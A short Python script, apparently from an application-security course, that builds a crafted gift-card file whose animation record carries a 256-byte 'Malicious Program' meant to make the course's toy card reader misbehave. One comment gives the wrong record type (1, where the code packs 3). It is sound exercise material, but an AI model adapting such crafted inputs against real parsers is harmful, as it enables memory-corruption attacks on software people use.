import struct
import sys

# We build the content of the file in a byte string first
# This lets us calculate the length for the header at the end
data = b''
data += b"GiftCardz.com".ljust(32, b' ')  # Merchant ID
data += b"B" * 32  # Customer ID
data += struct.pack("<I", 1)  # One record

# Record of type animation
data += struct.pack("<I", 8 + 32 + 256)  # Correct size
data += struct.pack("<I", 3)  # Record type = 1
data += b"Welcome to App Security !!".ljust(32, b' ')

# Malicious Program (256 bytes)
program = bytearray(256)

program[0] = 0x01
program[1] = 127
program[2] = 0xaa
program[3:] = b"\x00" * (256 - 3)
data += bytes(program)


f = open(sys.argv[1], 'wb')
datalen = len(data) + 4  # Plus 4 bytes for the length itself
f.write(struct.pack("<I", datalen))
f.write(data)
f.close()
